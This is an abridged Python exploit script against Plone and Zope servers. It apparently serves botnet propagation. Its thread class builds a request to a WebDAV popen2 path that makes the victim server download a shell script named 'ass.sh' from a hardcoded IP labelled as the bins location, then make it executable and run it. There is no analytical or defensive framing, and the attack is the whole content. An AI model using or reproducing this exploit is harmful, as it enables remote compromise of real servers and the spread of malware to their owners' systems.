#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# MULTI AFFLICTED FIRMW VERSION PLONE < 4.0-4.0.9, 4.1, 4.2, ZOPE 2.12.x and ZOPE 2.13.x.
...
ip = "81.28.6.115" # BINS LOCATION IP
...
class send_payload(threading.Thread):
	...
	def run(self):
		try:
			url = "http://" + self.ip + ":"+port+"/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=wget http://" + ip + "/ass.sh; curl -O http://" + ip + "/ass.sh; chmod +x ass.sh; ./ass.sh"
